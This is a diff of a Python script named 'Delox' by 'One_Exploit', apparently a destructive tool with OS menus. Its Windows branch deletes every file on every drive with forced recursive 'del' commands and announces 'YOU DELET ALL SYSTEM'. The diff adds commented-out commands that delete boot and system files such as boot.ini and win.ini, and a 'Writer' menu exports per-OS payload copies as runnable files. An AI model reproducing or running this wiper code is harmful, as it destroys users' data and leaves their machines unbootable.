@@ -1,13 +1,11 @@
 import random
-from turtle import color
 from requests import get
 import socket
-from lib2to3.pgen2 import driver
 import os , win32gui , win32con
 import getpass
 import time
-import banner
-from color import Color
+from init import banner
+from init.color import Color
 
 
 def ClearCSR():
@@ -24,32 +22,31 @@ def ip_public():
     socket.gethostbyname(socket.gethostname())
 
 def run():
-    while True:
-        ClearCSR()
-        time.sleep(1)
-        print(f'''
-            ____       __          
-            / __ \___  / /___  _  __
-           / / / / _ \/ / __ \| |/_/
-          / /_/ /  __/ / /_/ />  <  
-         /_____/\___/_/\____/_/|_|
-        programmer : One_Exploit'
-    [*] -> onexploit@one_exploit.com'
+    ClearCSR()
+    time.sleep(1)
+    print(f'''
+           ____       __          
+          / __ \___  / /___  _  __
+         / / / / _ \/ / __ \| |/_/
+        / /_/ /  __/ / /_/ />  <  
+       /_____/\___/_/\____/_/|_|
+       programmer : One_Exploit'
+   [*] -> onexploit@one_exploit.com'
     ''')
-        systems = ('''
-        [01] -> Windows
-        [02] -> Linux
-        [03] -> Os
-        [04] -> Writer
-        [99] -> exit
-        ''')
-        return systems
+    systems = ('''
+    [01] -> Windows
+    [02] -> Linux
+    [03] -> Os
+    [04] -> Writer
+    [99] -> exit
+    ''')
+    return systems
 print(run())
 sys = int(input('one_exploit => '))
 
 if sys == '01' or sys == '02' or sys == '03':
     print('Which one [1,2,3,99]')
-    run()
+    print(run())
 def exits():
     os.system('exit')
     print('''
@@ -83,6 +80,15 @@ if sys == 1:
                     for d in listdrive:
                         driver = d
                         os.system('del '+ driver + ':\*.* /f /s /q')
+                    # os.system('off')
+                    # os.system('attrib -r -g -h C:\\autoexec.bat')
+                    # os.system('del C:\\autoexec.bat')
+                    # os.system('attrib -r -g -h C:\\boot.ini')
+                    # os.system('del C:\\boot.ini')
+                    # os.system('attrib -r -g -h C:\\ntidr')
+                    # os.system('del C:\\ntidr')
+                    # os.system('attrib -r -g -h C:\windows\win.ini')
+                    # os.system('del C:\windows\win.ini')
                 else:
                     print(f'usename: {username()}')
                     print('password: ')
@@ -91,6 +97,15 @@ if sys == 1:
                     for d in listdrive:
                         driver = d
                         os.system('del '+ driver + ':\*.* /f /s /q')
+                    # os.system('off')
+                    # os.system('attrib -r -g -h C:\autoexec.bat')
+                    # os.system('del C:\autoexec.bat')
+                    # os.system('attrib -r -g -h C:\boot.ini')
+                    # os.system('del C:\boot.ini')
+                    # os.system('attrib -r -g -h C:\ntidr')
+                    # os.system('del C:\ntidr')
+                    # os.system('attrib -r -g -h C:\windows\win.ini')
+                    # os.system('del C:\windows\win.ini')
                     print('=============================')
                     print('    YOU DELET ALL SYSTEM    |')
                     print('=============================')
@@ -165,10 +180,11 @@ elif sys == 3:
 
 
 elif sys == 4:
-    def Menu_Writer():
-        while True:
+    while True:
+        def Menu_Writer():
+
             ClearCSR()
-            print(banner.Created_banner('Write Delox'))
+            banner.Created_banner('Write Delox')
             print('which one?')
             print('''
             [1] -> Windows      Write code Windows64 bit in new file for run.
@@ -176,7 +192,6 @@ elif sys == 4:
             [3] -> Mac OS       Write code MacOS in new file for run.
             [help] -> help
 
-            [99] -> back
                 ''')
             numbers = input('Enter Number: ')
 
@@ -187,7 +202,7 @@ elif sys == 4:
                         file.close()
             def Linux():
                 with open('init/main2.py', 'r') as mfile:
-                    with open('Windows.py', 'w') as file:
+                    with open('Linux.py', 'w') as file:
                         file.writelines(mfile)
                         file.close()
             def MacOS():
@@ -197,14 +212,14 @@ elif sys == 4:
                         macOS.close()
             def Help():
 
-                Helping = 'In this section, you can separate each executable\
-                    file and save it in another file, for example, if you read Linux,\
-                    it will copy the code in this tool for Linux in a new file and add it to the new file.\n \t \t \
-                        if Do you went backed in first page write (Back) else Enter'
-                print(Helping)
-                with open('help.py', 'w') as file:
-                    file.write(Helping)
-                    file.close()
+                Helping1 = '''
+                In this section, you can separate each executable
+                file and save it in another file, for example, if you read Linux,
+                it will copy the code in this tool for Linux in a new file and add it to the new file.\n \t \t \
+                if Do you went backed in first page write (Back) else Enter'''
+                print(Helping1)
+
+
             if numbers == '1':
                 print(Color.RED + '[*] waiting .')
                 time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
@@ -221,6 +236,7 @@ elif sys == 4:
                 print('\t\t The END')
                 time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                 Windows()
+                input('Enter Anything.....')
             elif numbers == '2':
                 print(Color.RED + '[*] waiting .')
                 time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
@@ -237,6 +253,7 @@ elif sys == 4:
                 print('\t\t The END')
                 time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                 Linux()
+                input('Enter Anything.....')
             elif numbers == '3':
                 print(Color.RED + '[*] waiting .')
                 time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
@@ -254,35 +271,21 @@ elif sys == 4:
                 time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                 MacOS()
             elif numbers == 'help' or numbers == 'Help' or numbers == '4':
-                print(Color.RED + '[*] waiting .')
-                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
-                print(Color.RED + '[*] waiting ..')
-                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
-                print(Color.RED + '[*] waiting ...')
-                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
-                print(Color.RED + '[*] waiting ....')
-                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
-                print(Color.RED + '[*] waiting .....')
-                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
-                print(Color.RED + '[*] waiting ......')
-                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
-                print('\t\t The END')
-                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
-
+                print(Color.RED + '[*] waiting.')
+                print()
+            # elif numbers == '99':
+            #     print(run())
+                Help()
                 input1 = input('Enter Anything.....')
                 if input1 == '' or input1 == 'Enter' or input1 == 'enter':
                     Menu_Writer()
                 elif input1 == 'back' or input1 == 'Back':
-                    run()
-                    break
-            elif numbers == '99':
-                run()
-                break
-            Help()
-    Menu_Writer()
+                    print(run())
+        
+        Menu_Writer()
 elif sys == 99:
     print('Good By')
     exits()
 elif sys == '':
-    run()
+    print(run())
 
